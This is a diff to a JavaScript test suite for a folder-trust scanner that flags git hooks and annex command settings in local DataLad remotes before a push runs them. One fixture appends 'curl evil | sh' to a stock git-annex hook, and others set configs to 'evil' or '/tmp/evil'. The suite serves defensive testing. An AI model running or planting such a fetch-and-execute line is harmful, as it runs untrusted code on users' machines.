@@ -6,7 +6,7 @@ import { pathToFileURL } from 'node:url'
 import { mkdtemp, mkdir, writeFile, chmod, realpath, symlink, rename } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
-import { findExecVectors, createTrustStore, describeVectors } from '../src/gui/folder-trust.js'
+import { findExecVectors, createTrustStore, describeVectors, localPath } from '../src/gui/folder-trust.js'
 import { ProcessRunner } from '../src/datalad/process-runner.js'
 
 const git = (cwd, ...args) => execFileSync('git', ['-C', cwd, ...args], { encoding: 'utf8', stdio: 'pipe' })
@@ -375,12 +375,12 @@ test('a hook that cannot be read is a not-fully-scanned finding, not a fingerpri
 // Push (datalad push) makes git-annex run the REMOTE repository's own hooks when the remote is a local path.
 // Remote URLs are set with `git config` (which escapes them): a Windows path written by hand into the
 // config file has backslashes, which git reads as escape sequences and rejects.
-const withRemote = async ({ hooks = { 'freezecontent-annex': '#!/bin/sh\n:\n' }, bare = false, url = (path) => path } = {}) => {
+const withRemote = async ({ hooks = { 'freezecontent-annex': '#!/bin/sh\n:\n' }, bare = false, url = (path) => path, dirName = 'R' } = {}) => {
   const base = await realpath(await mkdtemp(join(tmpdir(), 'trust-remote-')))
-  const remote = join(base, 'R')
+  const remote = join(base, dirName)
   if (bare) {
     git(base, 'init', '-q', '--bare', remote)
-    await hook(remote, 'freezecontent-annex', hooks['freezecontent-annex'])
+    for (const [name, body] of Object.entries(hooks)) await hook(remote, name, body)
   } else {
     await mkdir(remote)
     git(remote, 'init', '-q')
@@ -459,16 +459,16 @@ test('datalad push to a local-path dataset still works, and its hooks were repor
   const base = await realpath(await mkdtemp(join(tmpdir(), 'trust-push-')))
   const runner = new ProcessRunner()
   const remote = join(base, 'share')
-  execFileSync('datalad', ['create', remote], { stdio: 'pipe' })
+  datalad('create', remote)
   await hook(join(remote, '.git'), 'post-update-annex', '#!/bin/sh\n:\n')
   git(remote, 'config', 'receive.denyCurrentBranch', 'updateInstead') // a share that accepts pushes to its checked-out branch
   const clone = join(base, 'mine')
-  execFileSync('datalad', ['install', '-s', remote, clone], { stdio: 'pipe' })
+  datalad('install', '-s', remote, clone)
   await writeFile(join(clone, 'f.txt'), 'x')
-  await runner.run('datalad', ['-C', clone, 'save', '-m', 'x'], { cwd: clone })
+  await runner.run('datalad', ['-C', clone, 'save', '-m', 'x'], { cwd: clone, env: identity })
 
   assert.match(await flagged(clone), /remote origin .*hook post-update-annex [0-9a-f]{64}/)
-  const pushed = await runner.run('datalad', ['-C', clone, 'push'], { cwd: clone })
+  const pushed = await runner.run('datalad', ['-C', clone, 'push'], { cwd: clone, env: identity })
   assert.equal(pushed.failed, false, pushed.stderr)
 })
 
@@ -488,4 +488,109 @@ test('control and bidi characters never reach the dialog, and a long finding kee
   const long = describeVectors([`config ${'x'.repeat(300)}.clean = the-actual-command --flag`], { width: 100 })
   assert.match(long, /the-actual-command --flag$/)
   assert.ok(long.length <= 100)
+})
+
+// git clears GIT_CONFIG_COUNT for the receive-pack it starts on a local path, so none of the app's
+// environment overrides apply inside the remote: its own hooks and config run. It is judged like any repository.
+const RECEIVE_SIDE = ['pre-receive', 'update', 'proc-receive', 'post-receive', 'post-update', 'reference-transaction', 'push-to-checkout', 'pre-auto-gc']
+
+test("a local remote's ordinary git hooks are reported, because a push runs them", async () => {
+  const hooks = Object.fromEntries(RECEIVE_SIDE.map((name) => [name, '#!/bin/sh\n:\n']))
+  const out = await flagged((await withRemote({ hooks })).clone)
+  for (const name of RECEIVE_SIDE) assert.match(out, new RegExp(`remote origin .*hook ${name} [0-9a-f]{64}`), name)
+})
+
+test('sample hooks and an empty hooks folder in a remote are not reported', async () => {
+  const { clone } = await withRemote({ hooks: { 'post-receive.sample': '#!/bin/sh\n:\n' } })
+  assert.deepEqual(await findExecVectors(clone), [])
+})
+
+test("a local remote's config goes through the same allowlist as an opened repository's", async () => {
+  const { clone, remote } = await withRemote({ hooks: {} })
+  git(remote, 'config', 'annex.freezecontent-command', 'evil')
+  git(remote, 'config', 'core.hooksPath', '/tmp/evil')
+  git(remote, 'config', 'receive.denyCurrentBranch', 'updateInstead')
+  const out = await flagged(clone)
+  assert.match(out, /remote origin .*config annex\.freezecontent-command = evil/)
+  assert.match(out, /config core\.hookspath = \/tmp\/evil/)
+  // receive.denyCurrentBranch itself runs nothing (the hooks and filters it can trigger are judged on their own)
+  assert.doesNotMatch(out, /receive\.denycurrentbranch/)
+})
+
+test('a harmless remote config is not reported', async () => {
+  const { clone, remote } = await withRemote({ hooks: {} })
+  git(remote, 'config', 'annex.uuid', 'b3a2c1d0-0000-4000-8000-000000000000')
+  assert.deepEqual(await findExecVectors(clone), [])
+})
+
+test("a bare remote's config is judged too", async () => {
+  const { clone, remote } = await withRemote({ bare: true, hooks: {} })
+  execFileSync('git', ['config', '--file', join(remote, 'config'), 'annex.thawcontent-command', 'evil'])
+  assert.match(await flagged(clone), /remote origin .*config annex\.thawcontent-command = evil/)
+})
+
+test("a remote hooks folder that cannot be listed is reported, and its receive-side hooks are still found", { skip: (process.platform === 'win32' || isRoot) && 'needs POSIX permissions and a non-root user' }, async () => {
+  const { clone, remote } = await withRemote({ hooks: { 'post-receive': '#!/bin/sh\n:\n' } })
+  await chmod(join(remote, '.git', 'hooks'), 0o311)
+  try {
+    const out = await flagged(clone)
+    assert.match(out, /not fully scanned/)
+    assert.match(out, /hook post-receive [0-9a-f]{64}/)
+  } finally {
+    await chmod(join(remote, '.git', 'hooks'), 0o755)
+  }
+})
+
+// git reads file:// URLs by dropping the host and decoding %-escapes; '?' and '#' are part of the path.
+test('file:// URLs are read the way git reads them', { skip: process.platform === 'win32' && 'POSIX path forms' }, async () => {
+  assert.equal(localPath('file://somehost/srv/ds', '/r'), '/srv/ds')
+  assert.equal(localPath('file:///srv/a%41b', '/r'), '/srv/aAb')
+  assert.equal(localPath('file:///srv/q?z', '/r'), '/srv/q?z')
+  assert.equal(localPath('file:///srv/h#z', '/r'), '/srv/h#z')
+  assert.equal(localPath('file://localhost/srv/ds', '/r'), '/srv/ds')
+  assert.equal(localPath('file://', '/r'), null)
+  const odd = await withRemote({ dirName: 'h#z', url: (path) => `file://${path}` })
+  assert.match(await flagged(odd.clone), /hook freezecontent-annex/)
+  const host = await withRemote({ url: (path) => `file://somehost${path}` })
+  assert.match(await flagged(host.clone), /hook freezecontent-annex/)
+})
+
+test('a Windows drive in a file:// URL keeps its drive, and network URLs are still not local', () => {
+  assert.equal(localPath('file:///C:/Users/x/R', 'C:/r'), 'C:/Users/x/R')
+  assert.equal(localPath('ssh://example.invalid/ds', '/r'), null)
+  assert.equal(localPath('git@example.invalid:ds', '/r'), null)
+})
+
+// `datalad install` commits on a crippled filesystem (Windows), and a CI runner has no git identity.
+const identity = { GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t.t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t.t' }
+const datalad = (...args) => execFileSync('datalad', args, { stdio: 'pipe', env: { ...process.env, ...identity } })
+
+// A share made by datalad carries git-annex's own stock hooks and usually receive.denyCurrentBranch.
+// Prompting for those on every ordinary share would train people to click yes.
+test('a real datalad dataset used as a remote is not reported for its stock hooks or receive.denyCurrentBranch', { skip: !hasDatalad && 'datalad not installed' }, async () => {
+  const base = await realpath(await mkdtemp(join(tmpdir(), 'trust-share-')))
+  const remote = join(base, 'share')
+  datalad('create', remote)
+  git(remote, 'config', 'receive.denyCurrentBranch', 'updateInstead')
+  const clone = join(base, 'mine')
+  datalad('install', '-s', remote, clone)
+  assert.deepEqual(await findExecVectors(clone), [])
+})
+
+test('a stock git-annex hook is only skipped under its own name and with its exact content', async () => {
+  const stock = '#!/bin/sh\n# automatically configured by git-annex\ngit annex pre-commit .\n'
+  const { clone: ok } = await withRemote({ hooks: { 'pre-commit': stock } })
+  assert.deepEqual(await findExecVectors(ok), [])
+  const { clone: renamed } = await withRemote({ hooks: { 'post-receive': stock } })
+  assert.match(await flagged(renamed), /hook post-receive [0-9a-f]{64}/)
+  const { clone: extra } = await withRemote({ hooks: { 'pre-commit': `${stock}curl evil | sh\n` } })
+  assert.match(await flagged(extra), /hook pre-commit [0-9a-f]{64}/)
+  const { clone: crlf } = await withRemote({ hooks: { 'pre-commit': stock.replace(/\n/g, '\r\n') } })
+  assert.deepEqual(await findExecVectors(crlf), [])
+})
+
+test('the dialog shortens fingerprints so the hook name stays visible', () => {
+  const shown = describeVectors([`remote origin (/a/very/long/path/to/a/lab/share/with/many/folders/that/goes/on/and/on/R): hook pre-receive ${'ab12'.repeat(16)}`])
+  assert.match(shown, /hook pre-receive ab12ab12$/)
+  assert.ok(!shown.includes('ab12'.repeat(3)))
 })
